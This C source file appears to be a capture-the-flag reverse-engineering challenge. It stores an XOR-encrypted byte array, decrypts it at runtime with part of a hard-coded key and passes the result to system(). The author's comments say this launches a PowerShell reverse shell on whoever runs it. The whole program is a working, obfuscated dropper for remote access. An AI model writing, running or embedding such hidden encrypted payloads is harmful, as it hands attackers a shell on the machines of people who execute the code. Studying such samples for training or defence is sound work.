// This is a more difficult version
// They can get key by determining the substring and decode it with an xor decoder online
// the program other would launch a powershell reverse shell on them.


#include <stdio.h>
#include <stdlib.h>

char key[] = {'R','I','T','C','S', 'E', 'C','2','0','2','0','1'}; //Can be any chars, and any size array
char data[] = {51,60,50,38,64,67,90,38,63,41,99,31,126,93,19,115,104,13,93,94,123,99,126,18,99,122,89,86,39,54,43,99,31,117,74,38,48,101,1,75,64,83,48,32,101,110,113,95,95,46,50,43,39,18,126,87,52,126,10,33,88,85,81,55,115,22,58,65,68,87,46,125,11,38,70,30,97,44,48,46,38,70,67,28,23,16,21,0,94,89,87,45,39,109,97,3,2,5,109,99,107,115,28,1,16,111,103,113,119,6,25,9,103,32,120,103,81,92,91,38,61,49,109,117,85,70,16,39,55,38,83,93,26,106,104,30,33,75,68,87,24,14,24,103,80,13,2,109,125,115,118,7,3,7,63,118,62,115,79,11,69,43,58,41,38,26,24,22,42,115,120,99,22,67,28,17,54,36,39,26,20,80,111,115,117,111,18,20,80,109,31,32,45,85,68,90,106,122,101,110,92,85,18,115,122,62,120,22,84,83,55,50,101,126,18,24,124,38,36,104,12,80,90,87,32,39,101,110,102,73,66,38,29,36,46,87,16,97,58,32,49,38,95,30,102,38,43,49,109,115,99,113,10,26,0,45,81,95,86,42,61,34,106,28,119,87,55,0,49,49,91,94,85,107,119,39,111,2,28,18,103,58,108,120,22,67,80,99,110,101,107,91,85,74,99,119,33,34,70,81,18,113,109,99,114,18,76,18,12,38,49,110,97,68,64,42,61,34,99,27,11,22,48,49,119,126,22,67,80,104,113,21,16,18,18,25,107,35,50,39,27,30,98,34,39,45,104,16,14,18,97,104,97,48,80,68,18,126,115,109,24,70,85,74,55,125,32,45,81,95,86,42,61,34,30,8,10,115,16,16,12,10,27,30,117,38,39,7,58,70,85,65,107,119,54,33,0,25,9,103,32,107,20,64,89,70,38,123,97,48,80,68,30,115,127,97,48,80,68,28,15,54,43,36,70,88,27,120,119,54,109,116,92,71,48,59,109,106,79,11,22,32,63,44,38,92,68,28,0,63,42,48,87,24,27,67};

void encryptDecrypt(char* input, char* output, int size) {
	int keyLen = 7;
	char* sKey = (char*)malloc(sizeof(char) * keyLen);
	int i;
	
	for(i = 0; i < keyLen; i++) {	
		sKey[i] = key[i+3];
	}
	
	for(i = 0; i < size; i++) {
		output[i] = input[i] ^ sKey[i % keyLen];
	}
}

int main (int argc, char *argv[]) {
	int err = 0;
	int size = sizeof(data) / sizeof(data[0]);
	char* decrypted = (char*)malloc(sizeof(char) * size);
	
	encryptDecrypt(data, decrypted, size);
	err = system(decrypted);
	
}